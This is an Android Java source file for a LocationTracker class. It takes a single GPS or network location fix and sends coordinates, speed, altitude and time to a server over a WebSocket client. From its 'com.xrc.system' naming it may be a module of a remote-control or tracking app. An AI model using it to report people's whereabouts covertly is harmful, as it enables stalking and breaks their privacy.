package com.xrc.system.features;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class LocationTracker {
    private static final String TAG = Constants.TAG + ":Loc";
    private static LocationTracker instance;
    private final Context ctx;
    private final LocationManager lm;

    private LocationTracker(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
    }

    public static synchronized LocationTracker get(Context ctx) {
        if (instance == null) instance = new LocationTracker(ctx);
        return instance;
    }

    public void fetchAndSend() {
        try {
            if (lm == null) return;
            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendLocation(location);
                    lm.removeUpdates(this);
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };
            try {
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            } catch (SecurityException e) {
                Log.e(TAG, "GPS permission denied", e);
                try {
                    lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
                } catch (SecurityException e2) {
                    Log.e(TAG, "Network location permission denied", e2);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Location fetch failed", e);
        }
    }

    private void sendLocation(Location loc) {
        try {
            JSONObject data = new JSONObject();
            data.put("lat", loc.getLatitude());
            data.put("lon", loc.getLongitude());
            data.put("accuracy", loc.getAccuracy());
            data.put("altitude", loc.getAltitude());
            data.put("speed", loc.getSpeed());
            data.put("time", loc.getTime());
            data.put("provider", loc.getProvider());
            XRCWebSocketClient.get(ctx).sendEvent("location", data);
        } catch (JSONException e) {
            Log.e(TAG, "Location send failed", e);
        }
    }
}
